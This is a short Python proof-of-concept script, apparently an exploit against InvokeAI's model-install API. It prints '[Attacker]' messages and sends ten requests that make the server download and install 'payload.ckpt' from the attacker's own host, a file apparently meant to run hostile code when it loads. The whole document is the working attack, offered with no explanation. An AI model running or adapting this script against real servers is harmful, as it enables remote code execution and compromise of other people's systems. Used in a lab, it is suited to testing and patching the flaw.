import os
import time
hostname = os.uname()[1]

def request_model_download():
    import requests

    for _ in range(10):
        url = "http://invokeai:9090/api/v2/models/install"
        params = {
            "source": f"http://{hostname}:8801/payload.ckpt",
            "inplace": "true"
        }
        response = requests.post(url, params=params, json={})
        print(f"[Attacker] Model download request sent: {response.status_code}")
        print(f"[Attacker] Model download response: {response.text}")

        time.sleep(1)

request_model_download()
